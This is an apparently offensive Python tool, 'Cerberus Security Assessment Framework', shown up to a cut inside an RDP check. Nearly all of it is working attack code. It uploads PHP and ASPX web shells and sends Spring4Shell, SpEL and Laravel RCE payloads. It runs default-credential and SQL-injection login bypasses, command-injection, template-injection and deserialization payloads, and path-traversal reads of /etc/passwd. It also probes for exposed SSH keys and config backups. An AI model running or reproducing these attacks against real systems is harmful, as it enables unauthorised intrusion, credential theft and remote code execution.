#!/usr/bin/env python3
"""
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ 
 ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
                                                                                                                          
     Cerberus Security Assessment Framework 
           by: ek0ms savi0r
"""

import argparse
import sys
import time
import requests
import socket
import subprocess
import json
import base64
import random
import csv
import zipfile
from datetime import datetime
from typing import Dict, List, Tuple
import os
import urllib3
import threading
import readline
import concurrent.futures
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import socks
    TOR_AVAILABLE = True
except ImportError:
    TOR_AVAILABLE = False

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'

class WebShellDeployer:
    """Advanced web shell deployment and management"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.deployed_shells = []
        
    def deploy_php_shell(self, upload_url: str = None) -> str:
        """Deploy PHP web shell with multiple techniques"""
        php_shells = {
            'basic': "<?php system($_REQUEST['cmd']); ?>",
            'advanced': "<?php if(isset($_REQUEST['c'])){ system($_REQUEST['c']); } ?>",
            'obfuscated': "<?php @eval($_POST['cerberus']); ?>",
            'mini': "<?=`$_GET[0]`?>",
            'base64': "<?php eval(base64_decode($_REQUEST['e'])); ?>"
        }
        
        # Try multiple deployment methods
        deployment_methods = [
            self._deploy_via_upload,
            self._deploy_via_file_write,
            self._deploy_via_log_poisoning,
            self._deploy_via_template_injection
        ]
        
        for method in deployment_methods:
            for name, shell_code in php_shells.items():
                shell_url = method(shell_code, name)
                if shell_url:
                    print(f"{Colors.GREEN}[+] PHP WebShell deployed: {shell_url}{Colors.END}")
                    self.deployed_shells.append(shell_url)
                    return shell_url
        return None
    
    def _deploy_via_upload(self, shell_code: str, name: str) -> str:
        """Deploy shell via file upload vulnerabilities"""
        upload_endpoints = [
            f"http://{self.target}:{self.port}/upload",
            f"http://{self.target}:{self.port}/admin/upload",
            f"http://{self.target}:{self.port}/file/upload",
            f"http://{self.target}:{self.port}/image/upload"
        ]
        
        for endpoint in upload_endpoints:
            try:
                files = {
                    'file': (f'{name}.php', shell_code, 'application/x-php'),
                    'upload': (None, 'Submit'),
                    'file_upload': (None, '1')
                }
                
                response = self.session.post(
                    endpoint,
                    files=files,
                    timeout=5,
                    verify=False
                )
                
                if response.status_code == 200:
                    # Try to guess the uploaded file location
                    possible_locations = [
                        f"http://{self.target}:{self.port}/uploads/{name}.php",
                        f"http://{self.target}:{self.port}/upload/{name}.php",
                        f"http://{self.target}:{self.port}/images/{name}.php",
                        f"http://{self.target}:{self.port}/files/{name}.php"
                    ]
                    
                    for location in possible_locations:
                        test_response = self.session.get(location, timeout=3)
                        if test_response.status_code == 200:
                            return location
                            
            except:
                continue
        return None
    
    def _deploy_via_file_write(self, shell_code: str, name: str) -> str:
        """Deploy shell via file write vulnerabilities"""
        # This would require command execution first
        return None
    
    def deploy_asp_shell(self) -> str:
        """Deploy ASP/X web shells"""
        asp_shells = {
            'basic': '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start(Request["cmd"]); %>',
            'cmd': '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>'
        }
        
        for name, shell_code in asp_shells.items():
            upload_endpoints = [
                f"http://{self.target}:{self.port}/upload.aspx",
                f"http://{self.target}:{self.port}/upload"
            ]
            
            for endpoint in upload_endpoints:
                try:
                    files = {'file': (f'{name}.aspx', shell_code, 'application/x-aspx')}
                    response = self.session.post(endpoint, files=files, timeout=5)
                    
                    if response.status_code == 200:
                        shell_url = f"http://{self.target}:{self.port}/uploads/{name}.aspx"
                        test_response = self.session.get(shell_url, timeout=3)
                        if test_response.status_code == 200:
                            return shell_url
                except:
                    continue
        return None

class FrameworkExploiter:
    """Framework-specific exploitation modules"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        
    def exploit_spring_rce(self) -> bool:
        """Spring Framework RCE exploits"""
        print(f"{Colors.CYAN}[>] Testing Spring Framework RCE...{Colors.END}")
        
        spring_payloads = [
            # Spring4Shell (CVE-2022-22965)
            {'class.module.classLoader.resources.context.parent.pipeline.first.pattern': '%{c2}i'},
            {'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT'},
            
            # Spring Cloud Function SpEL (CVE-2022-22963)
            {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'},
            
            # Spring Data Commons (CVE-2018-1273)
            {'username': '#{T(java.lang.Runtime).getRuntime().exec("whoami")}'}
        ]
        
        endpoints = [
            f"http://{self.target}:{self.port}/",
            f"http://{self.target}:{self.port}/api/users",
            f"http://{self.target}:{self.port}/admin",
            f"http://{self.target}:{self.port}/functionRouter"
        ]
        
        for endpoint in endpoints:
            for payload in spring_payloads:
                try:
                    response = self.session.post(endpoint, data=payload, timeout=3)
                    if any(indicator in response.text for indicator in ['root', 'admin', 'uid=']):
                        print(f"{Colors.GREEN}[+] Spring RCE successful at {endpoint}{Colors.END}")
                        return True
                except:
                    continue
        return False
    
    def exploit_laravel_rce(self) -> bool:
        """Laravel Framework RCE exploits"""
        print(f"{Colors.CYAN}[>] Testing Laravel RCE...{Colors.END}")
        
        # Laravel debug mode RCE
        debug_url = f"http://{self.target}:{self.port}/_ignition/execute-solution"
        payload = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "username",
                "viewFile": "php://filter/convert.base64-encode/resource=/etc/passwd"
            }
        }
        
        try:
            response = self.session.post(debug_url, json=payload, timeout=3)
            if "root:" in response.text:
                print(f"{Colors.GREEN}[+] Laravel debug RCE successful{Colors.END}")
                return True
        except:
            pass
        
        # Laravel token unserialize RCE
        token_payload = "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\0*\0events\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"\0*\0queueResolver\";s:6:\"system\";}s:8:\"\0*\0event\";s:8:\"whoami\";}"
        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}/",
                cookies={'laravel_session': token_payload},
                timeout=3
            )
            if "root" in response.text or "www-data" in response.text:
                print(f"{Colors.GREEN}[+] Laravel token unserialize RCE successful{Colors.END}")
                return True
        except:
            pass
        
        return False
    
    def exploit_wordpress_rce(self) -> bool:
        """WordPress-specific RCE exploits"""
        print(f"{Colors.CYAN}[>] Testing WordPress RCE...{Colors.END}")
        
        # Test for vulnerable plugins
        vulnerable_plugins = {
            'revslider': '/wp-content/plugins/revslider/temp/update_extract/revslider/rs.php',
            'formidable': '/wp-admin/admin-ajax.php?action=frm_forms_preview&form=1'
        }
        
        for plugin, endpoint in vulnerable_plugins.items():
            try:
                url = f"http://{self.target}:{self.port}{endpoint}"
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    print(f"{Colors.YELLOW}[!] Potentially vulnerable WordPress plugin: {plugin}{Colors.END}")
                    return True
            except:
                continue
        return False

class AuthBypasser:
    """Advanced authentication bypass techniques"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        
    def bypass_login(self, login_url: str) -> bool:
        """Attempt multiple authentication bypass techniques"""
        print(f"{Colors.CYAN}[>] Attempting authentication bypass on {login_url}{Colors.END}")
        
        techniques = [
            self._default_credentials,
            self._sql_injection_auth,
            self._parameter_pollution,
            self._header_injection,
            self._cookie_manipulation 
        ]
        
        for technique in techniques:
            if technique(login_url):
                return True
        return False
    
    def _default_credentials(self, login_url: str) -> bool:
        """Try common default credentials"""
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('root', 'root'),
            ('root', 'password'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('administrator', 'password'),
            ('admin', '')
        ]
        
        for username, password in credentials:
            try:
                data = {
                    'username': username,
                    'password': password,
                    'email': username,
                    'user': username,
                    'login': 'Login'
                }
                
                response = self.session.post(login_url, data=data, timeout=3)
                if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'success']):
                    print(f"{Colors.GREEN}[+] Default credentials worked: {username}:{password}{Colors.END}")
                    return True
            except:
                continue
        return False
    
    def _sql_injection_auth(self, login_url: str) -> bool:
        """SQL injection in authentication"""
        sql_payloads = [
            {"username": "' OR '1'='1'--", "password": "anything"},
            {"username": "admin'--", "password": "anything"},
            {"username": "admin'/*", "password": "anything"},
            {"username": "' OR 1=1--", "password": "anything"},
            {"email": "' OR '1'='1'--", "password": "anything"}
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.post(login_url, data=payload, timeout=3)
                if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout']):
                    print(f"{Colors.GREEN}[+] SQL injection auth bypass successful{Colors.END}")
                    return True
            except:
                continue
        return False
    
    def _parameter_pollution(self, login_url: str) -> bool:
        """HTTP parameter pollution attacks"""
        pollution_payloads = [
            {"username": "admin", "username": "test", "password": "admin"},
            {"user": "admin", "username": "admin", "password": "password"},
            {"email": "admin@admin.com", "username": "admin", "password": "password"}
        ]
        
        for payload in pollution_payloads:
            try:
                response = self.session.post(login_url, data=payload, timeout=3)
                if response.status_code == 302 or 'dashboard' in response.text.lower():
                    print(f"{Colors.GREEN}[+] Parameter pollution auth bypass successful{Colors.END}")
                    return True
            except:
                continue
        return False

    def _header_injection(self, login_url: str) -> bool:
        """Header injection authentication bypass"""
        headers_payloads = [
            {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
            {'X-Original-URL': '/admin', 'X-Rewrite-URL': '/admin'},
            {'User-Agent': 'Googlebot/2.1'},
            {'Referer': 'http://127.0.0.1/admin'}
        ]
    
        for headers in headers_payloads:
            try:
                response = self.session.post(login_url, data={'username': 'admin', 'password': 'admin'}, 
                                           headers=headers, timeout=3)
                if response.status_code == 302 or 'dashboard' in response.text.lower():
                    print(f"{Colors.GREEN}[+] Header injection auth bypass successful{Colors.END}")
                    return True
            except:
                continue
        return False

    def _cookie_manipulation(self, login_url: str) -> bool:
        """Cookie manipulation authentication bypass"""
        cookie_payloads = [
            {'admin': 'true', 'authenticated': '1', 'logged_in': 'true'},
            {'user': 'admin', 'role': 'admin', 'access_level': 'admin'},
            {'is_admin': '1', 'auth': 'true', 'login': 'success'}
        ]
    
        for cookies in cookie_payloads:
            try:
                self.session.cookies.update(cookies)
                response = self.session.get(login_url, timeout=3)
                if 'dashboard' in response.text.lower() or response.status_code == 302:
                    print(f"{Colors.GREEN}[+] Cookie manipulation auth bypass successful{Colors.END}")
                    return True
            except:
                continue
        return False
    
class AdvancedRCEExploiter:
    """Advanced RCE exploitation with multiple techniques"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.webshell_deployer = WebShellDeployer(target, port)
        self.framework_exploiter = FrameworkExploiter(target, port)
        self.auth_bypasser = AuthBypasser(target, port)
        
    def comprehensive_rce_attack(self, endpoint: str = None) -> str:
        """Launch comprehensive RCE attack using all techniques"""
        print(f"{Colors.CYAN}[>] Starting comprehensive RCE attack...{Colors.END}")
        
        # Method 1: Framework-specific exploits
        if self.framework_exploiter.exploit_spring_rce():
            return "Spring RCE"
        if self.framework_exploiter.exploit_laravel_rce():
            return "Laravel RCE"
        if self.framework_exploiter.exploit_wordpress_rce():
            return "WordPress RCE"
        
        # Method 2: Web shell deployment
        shell_url = self.webshell_deployer.deploy_php_shell()
        if shell_url:
            return f"WebShell deployed: {shell_url}"
        
        # Method 3: Authentication bypass + admin RCE
        admin_endpoints = [
            f"http://{self.target}:{self.port}/admin",
            f"http://{self.target}:{self.port}/administrator",
            f"http://{self.target}:{self.port}/wp-admin"
        ]
        
        for admin_url in admin_endpoints:
            if self.auth_bypasser.bypass_login(admin_url):
                # Now try RCE from admin panel
                rce_result = self._admin_panel_rce(admin_url)
                if rce_result:
                    return f"Admin RCE: {rce_result}"
        
        return "No RCE method successful"
    
    def _admin_panel_rce(self, admin_url: str) -> str:
        """Attempt RCE through admin panel functionality"""
        rce_vectors = [
            {'page': '<?php system($_GET["cmd"]); ?>', 'template': '<?php system($_GET["cmd"]); ?>'},
            {'command': 'whoami', 'cmd': 'whoami', 'exec': 'whoami'},
            {'file': '../../../../../../etc/passwd', 'path': '../../../../../../etc/passwd'}
        ]
        
        for vector in rce_vectors:
            try:
                response = self.session.post(admin_url, data=vector, timeout=3)
                if 'root:' in response.text or 'www-data' in response.text:
                    return "Admin panel RCE successful"
            except:
                continue
        return None

class IntelligentRCEExploiter:
    """Enhanced RCE exploitation with advanced techniques"""
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.session = requests.Session()
        self.found_endpoints = []
        self.advanced_exploiter = AdvancedRCEExploiter(target, port)
        
    def exploit_found_endpoint(self, endpoint: str, command: str) -> str:
        """Intelligently exploit discovered RCE endpoints with advanced techniques"""
        print(f"{Colors.GREEN}[+] ADVANCED EXPLOITATION: {endpoint}{Colors.END}")
        
        url = f"http://{self.target}:{self.port}{endpoint}"
        
        # Enhanced exploitation techniques
        exploitation_methods = [
            self._exploit_advanced_json_rpc,
            self._exploit_rest_api_with_auth,
            self._exploit_command_injection_advanced,
            self._exploit_deserialization,
            self._exploit_template_injection,
            self._exploit_advanced_rest_api
        ]
        
        for method in exploitation_methods:
            result = method(url, command)
            if result and "Command execution failed" not in result:
                return result
        
        # Try comprehensive attack if specific endpoint fails
        if '/admin' in endpoint:
            print(f"{Colors.CYAN}[>] Attempting comprehensive admin RCE attack...{Colors.END}")
            result = self.advanced_exploiter.comprehensive_rce_attack(endpoint)
            if "successful" in result.lower():
                return f"Comprehensive attack: {result}"
        
        return f"{Colors.RED}[-] Advanced exploitation failed: {endpoint}{Colors.END}"
    
    def _exploit_advanced_json_rpc(self, url: str, command: str) -> str:
        """Advanced JSON-RPC exploitation"""
        advanced_payloads = [
            # PHP deserialization
            {"__PHP_INJECTION__": f'O:8:"stdClass":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'},
            
            # Java deserialization
            {"@type": "java.lang.Runtime", "exec": command},
            
            # Node.js RCE
            {"constructor": {"prototype": {"polluted": "rce"}}, "command": command},
            
            # Complex nested objects
            {"data": {"__proto__": {"command": command}}, "execute": True},
            {"query": {"$where": f"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('{command}')"}}
        ]
        
        for payload in advanced_payloads:
            try:
                response = self.session.post(
                    url,
                    json=payload,
                    timeout=5,
                    verify=False,
                    headers={'Content-Type': 'application/json'}
                )
                if self._is_successful_execution(response, command):
                    return f"JSON-RPC: {response.text}"
            except:
                continue
        return None
    
    def _exploit_deserialization(self, url: str, command: str) -> str:
        """Deserialization attack vectors"""
        # PHP deserialization
        php_payload = f'O:8:"stdClass":1:{{s:3:"cmd";s:{len(command)}:"{command}";}}'
        
        # Java deserialization (simplified)
        java_payload = base64.b64encode(b'\xac\xed\x00\x05').decode() + '...'
        
        # Python pickle
        python_payload = base64.b64encode(
            f'c__builtin__\neval\n(c__builtin__\ncompile\n(S"{command}"\nS""\nS"exec")\ntR.'.encode()
        ).decode()
        
        deserialization_payloads = {
            'data': php_payload,
            'input': php_payload,
            'object': java_payload,
            'serialized': php_payload,
            'pickle': python_payload
        }
        
        for param, payload in deserialization_payloads.items():
            try:
                response = self.session.post(
                    url,
                    data={param: payload},
                    timeout=5,
                    verify=False
                )
                if self._is_successful_execution(response, command):
                    return f"Deserialization: {response.text}"
            except:
                continue
        return None
    
    def _exploit_template_injection(self, url: str, command: str) -> str:
        """Template injection attacks"""
        template_payloads = {
            'SSTI': {
                'template': f'${{7*7}}',
                'name': f'${{"a".getClass().forName("java.lang.Runtime").getRuntime().exec("{command}")}}',
                'input': f'{{{{"".__class__.__mro__[1].__subclasses__()[396]("{command}",shell=True)}}}}',
                'query': f'#{{7*7}}'
            },
            'Jinja2': {
                'template': '{{ config.items() }}',
                'name': f'{{{{ cycler.__init__.__globals__.os.popen("{command}").read() }}}}'
            },
            'Twig': {
                'template': '{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}'
            }
        }
        
        for engine, payloads in template_payloads.items():
            for param, payload in payloads.items():
                try:
                    response = self.session.post(
                        url,
                        data={param: payload},
                        timeout=5,
                        verify=False
                    )
                    if self._is_successful_execution(response, command):
                        return f"Template Injection ({engine}): {response.text}"
                except:
                    continue
        return None
    
    def _exploit_command_injection_advanced(self, url: str, command: str) -> str:
        """Advanced command injection techniques"""
        # Enhanced payload sets for different environments
        windows_payloads = [
            f"& {command}",
            f"| {command}",
            f"|| {command}",
            f"^ {command}",
            f"cmd /c {command}",
            f"powershell -c {command}",
            f"wmic process call create '{command}'",
            f"for /f %i in ('{command}') do echo %i"
        ]
        
        linux_payloads = [
            f";{command}",
            f"|{command}",
            f"||{command}",
            f"&&{command}",
            f"`{command}`",
            f"$({command})",
            f"{{{{{command}}}}}",
            f"\n{command}\n",
            f"127.0.0.1;{command}",
            f"localhost|{command}",
            f"/bin/sh -c '{command}'",
            f"bash -c '{command}'",
            f"python -c \"import os; os.system('{command}')\"",
            f"perl -e 'system \"{command}\"'",
            f"php -r \"system('{command}');\""
        ]
        
        all_payloads = windows_payloads + linux_payloads
        
        injection_points = {
            'ip': '127.0.0.1',
            'host': 'localhost',
            'target': '127.0.0.1',
            'domain': 'example.com',
            'url': 'http://example.com',
            'file': 'test.txt',
            'path': '/tmp/test',
            'username': 'test',
            'email': 'test@test.com'
        }
        
        for payload in all_payloads:
            for param, value in injection_points.items():
                try:
                    injected_value = f"{value}{payload}"
                    response = self.session.post(
                        url,
                        data={param: injected_value},
                        timeout=3,
                        verify=False
                    )
                    if self._is_successful_execution(response, command):
                        return f"Command Injection: {response.text}"
                except:
                    continue
        return None
    
    def _exploit_rest_api_with_auth(self, url: str, command: str) -> str:
        """REST API exploitation with authentication bypass attempts"""
        # First try without auth
        methods = ['POST', 'GET', 'PUT', 'PATCH', 'DELETE']
        
        for method in methods:
            try:
                if method == 'POST':
                    # Enhanced parameter list
                    enhanced_params = {
                        'command': command, 'cmd': command, 'exec': command,
                        'query': command, 'input': command, 'system': command,
                        'run': command, 'execute': command, 'shell': command,
                        'code': f'system("{command}");',
                        'data': f'<?php system("{command}"); ?>',
                        'script': f'print(os.system("{command}"))'
                    }
                    
                    for param, value in enhanced_params.items():
                        response = self.session.post(
                            url,
                            data={param: value},
                            timeout=3,
                            verify=False,
                            headers={'X-Forwarded-For': '127.0.0.1'}
                        )
                        if self._is_successful_execution(response, command):
                            return f"REST API: {response.text}"
                
                elif method == 'GET':
                    # URL parameter injection
                    get_params = {
                        'cmd': command, 'command': command, 'exec': command,
                        'code': command, 'system': command
                    }
                    
                    for param, value in get_params.items():
                        test_url = f"{url}?{param}={requests.utils.quote(value)}"
                        response = self.session.get(test_url, timeout=3, verify=False)
                        if self._is_successful_execution(response, command):
                            return f"REST API GET: {response.text}"
                            
            except:
                continue
        return None
    
    def _is_successful_execution(self, response, command: str) -> bool:
        """Enhanced execution success detection"""
        if response.status_code not in [200, 201, 302]:
            return False
            
        content = response.text.lower()
        
        # Enhanced success indicators
        success_indicators = [
            'root', 'user', 'admin', 'uid=', 'gid=', '/home/', '/root/',
            'linux', 'windows', 'system32', 'etc/passwd', 'www-data',
            'nt authority\\system', 'c:\\windows', 'program files',
            'cerberus_test', 'success', 'completed'
        ]
        
        # Command-specific validation
        if 'whoami' in command and any(indicator in content for indicator in ['root', 'user', 'admin', 'www-data']):
            return True
        if 'id' in command and any(indicator in content for indicator in ['uid=', 'gid=']):
            return True
        if 'pwd' in command and '/' in content and len(content) < 100:
            return True
        if 'echo cerberus_test' in command and 'cerberus_test' in content:
            return True
        if 'hostname' in command and len(content.strip()) < 50:
            return True
            
        return any(indicator in content for indicator in success_indicators)

class ServiceSpecificExploiter:
    """Enhanced service-specific exploitation"""
    
    def __init__(self, target: str):
        self.target = target
        self.auth_bypasser = AuthBypasser(target, 80)  # Default port
        
    def exploit_service(self, port: int, service: str):
        """Exploit specific services based on port with advanced techniques"""
        print(f"{Colors.CYAN}[>] ADVANCED exploitation: {service} on port {port}{Colors.END}")
        
        if port == 21:
            return self._exploit_ftp_advanced()
        elif port == 22:
            return self._exploit_ssh_advanced()
        elif port == 23:
            return self._exploit_telnet()
        elif port == 53:
            return self._exploit_dns_advanced()
        elif port == 80 or port == 443:
            return self._exploit_web_advanced(port)
        elif port == 445:
            return self._exploit_smb_advanced()
        elif port == 3389:
            return self._exploit_rdp_advanced()
        else:
            return self._exploit_generic_advanced(port, service)
    
    def _exploit_web_advanced(self, port: int):
        """Advanced web service exploitation"""
        protocols = ['http', 'https'] if port == 443 else ['http']
        
        for protocol in protocols:
            base_url = f"{protocol}://{self.target}:{port}"
            
            # Enhanced vulnerability testing
            vulnerabilities = [
                self._test_directory_traversal_advanced(base_url),
                self._test_file_inclusion_advanced(base_url),
                self._test_backup_files_advanced(base_url),
                self._test_admin_panels_advanced(base_url),
                self._test_auth_bypass_advanced(base_url)
            ]
            
            if any(vulnerabilities):
                return True
                
            # Try framework-specific exploits
            framework_exploiter = FrameworkExploiter(self.target, port)
            if framework_exploiter.exploit_spring_rce():
                return True
            if framework_exploiter.exploit_laravel_rce():
                return True
            if framework_exploiter.exploit_wordpress_rce():
                return True
                
        return False
    
    def _test_auth_bypass_advanced(self, base_url: str) -> bool:
        """Test authentication bypass on admin panels"""
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/login', 
            '/dashboard', '/control', '/manager', '/admin/login',
            '/administrator/login', '/wp-login.php'
        ]
        
        for path in admin_paths:
            login_url = f"{base_url}{path}"
            if self.auth_bypasser.bypass_login(login_url):
                print(f"{Colors.GREEN}[+] Authentication bypass successful: {login_url}{Colors.END}")
                return True
        return False
    
    def _test_directory_traversal_advanced(self, base_url: str) -> bool:
        """Advanced directory traversal testing"""
        payloads = [
            "../../../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "../".join([""]*10) + "etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%2fpasswd"
        ]
        
        test_endpoints = ['/files', '/download', '/view', '/image', '/load', '/file', '/document']
        
        for endpoint in test_endpoints:
            for payload in payloads:
                try:
                    url = f"{base_url}{endpoint}?file={payload}"
                    response = requests.get(url, timeout=3, verify=False)
                    if "root:" in response.text and "bin/" in response.text:
                        print(f"{Colors.GREEN}[+] Directory traversal found: {url}{Colors.END}")
                        return True
                except:
                    continue
        return False
    
    def _test_file_inclusion_advanced(self, base_url: str) -> bool:
        """Advanced file inclusion testing"""
        payloads = [
            "../../../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "zip://path/to/archive.zip#file.txt",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://whoami"
        ]
        
        test_endpoints = ['/include', '/load', '/view', '/file', '/page', '/template']
        
        for endpoint in test_endpoints:
            for payload in payloads:
                try:
                    url = f"{base_url}{endpoint}?page={payload}"
                    response = requests.get(url, timeout=3, verify=False)
                    if "root:" in response.text or "PD9waHA" in response.text:
                        print(f"{Colors.GREEN}[+] File inclusion found: {url}{Colors.END}")
                        return True
                except:
                    continue
        return False
    
    def _test_backup_files_advanced(self, base_url: str) -> bool:
        """Advanced backup file discovery"""
        backup_files = [
            '/.git/config', '/backup.zip', '/database.sql', '/dump.sql',
            '/wp-config.php.bak', '/.env.bak', '/config.bak', '/web.config.bak',
            '/.bash_history', '/.ssh/id_rsa', '/.ssh/id_rsa.pub',
            '/backup.tar.gz', '/www.zip', '/site.tar', '/admin.bak',
            '/.DS_Store', '/thumbs.db', '/error.log', '/access.log'
        ]
        
        for backup_file in backup_files:
            try:
                url = f"{base_url}{backup_file}"
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and len(response.text) > 0:
                    print(f"{Colors.GREEN}[+] Sensitive file found: {url}{Colors.END}")
                    return True
            except:
                continue
        return False
    
    def _test_admin_panels_advanced(self, base_url: str) -> bool:
        """Advanced admin panel discovery"""
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/login', 
            '/dashboard', '/control', '/manager', '/webadmin',
            '/admin.php', '/administrator.php', '/login.php',
            '/cpanel', '/whm', '/plesk', '/webmin'
        ]
        
        for path in admin_paths:
            try:
                url = f"{base_url}{path}"
                response = requests.get(url, timeout=3, verify=False)
                if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ['login', 'admin', 'password', 'username']):
                    print(f"{Colors.YELLOW}[!] Admin panel found: {url}{Colors.END}")
                    return True
            except:
                continue
        return False
    
    def _exploit_ftp_advanced(self):
        """Advanced FTP exploitation"""
        try:
            from ftplib import FTP
            ftp = FTP(self.target)
            
            # Try anonymous login
            try:
                ftp.login()  # Anonymous
                print(f"{Colors.GREEN}[+] FTP anonymous login allowed{Colors.END}")
                
                # List files and look for interesting ones
                files = ftp.nlst()
                if files:
                    print(f"{Colors.YELLOW}[!] FTP files: {files}{Colors.END}")
                
                ftp.quit()
                return True
            except:
                pass
            
            # Try common credentials
            credentials = [
                ('admin', 'admin'), ('ftp', 'ftp'), ('test', 'test'),
                ('user', 'user'), ('root', 'root'), ('anonymous', 'anonymous')
            ]
            
            for username, password in credentials:
                try:
                    ftp.login(username, password)
                    print(f"{Colors.GREEN}[+] FTP login successful: {username}:{password}{Colors.END}")
                    ftp.quit()
                    return True
                except:
                    continue
                    
        except Exception as e:
            print(f"{Colors.RED}[-] FTP exploitation failed: {str(e)}{Colors.END}")
        
        return False
    
    def _exploit_ssh_advanced(self):
        """Advanced SSH exploitation"""
        print(f"{Colors.CYAN}[>] Testing SSH with common credentials...{Colors.END}")
        
        # This would typically use paramiko, but for simplicity we'll just note it
        common_creds = [
            ('root', 'root'), ('admin', 'admin'), ('test', 'test'),
            ('user', 'user'), ('ubuntu', 'ubuntu'), ('debian', 'debian')
        ]
        
        for username, password in common_creds:
            print(f"{Colors.YELLOW}[!] Try SSH: {username}:{password}{Colors.END}")
            
        print(f"{Colors.YELLOW}[!] SSH service detected - consider using hydra or medusa for brute force{Colors.END}")
        return False
    
    def _exploit_dns_advanced(self):
        """Advanced DNS exploitation"""
        try:
            import dns.resolver
            import dns.zone
            
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.target]
            
            # Test zone transfer
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(self.target, self.target))
                print(f"{Colors.GREEN}[+] DNS zone transfer successful!{Colors.END}")
                return True
            except:
                pass
            
            # Test DNS recursion
            try:
                resolver.query('google.com', 'A')
                print(f"{Colors.YELLOW}[!] DNS recursion enabled{Colors.END}")
                return True
            except:
                pass
                
        except ImportError:
            pass
            
        print(f"{Colors.YELLOW}[!] DNS service detected - multiple attack vectors possible{Colors.END}")
        return False
    
    def _exploit_smb_advanced(self):
        """Advanced SMB exploitation"""
        print(f"{Colors.CYAN}[>] Testing SMB vulnerabilities...{Colors.END}")
        
        # Check for anonymous access
        try:
            result = subprocess.run(
                ['smbclient', '-L', f'//{self.target}', '-N'],
                capture_output=True, text=True, timeout=10
            )
            if 'Sharename' in result.stdout:
                print(f"{Colors.GREEN}[+] SMB anonymous access allowed{Colors.END}")
                return True
        except:
            pass
            
        print(f"{Colors.YELLOW}[!] SMB service detected - check for EternalBlue and anonymous shares{Colors.END}")
        return False
    
    def _exploit_rdp_advanced(self):
        """Advanced RDP exploitation"""
        print(f"{Colors.CYAN}[>] Testing RDP vulnerabilities...{Colors.END}")
        
        # Check if port is open and service is running
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, 3389))
            sock.close()
            
            if result == 0:
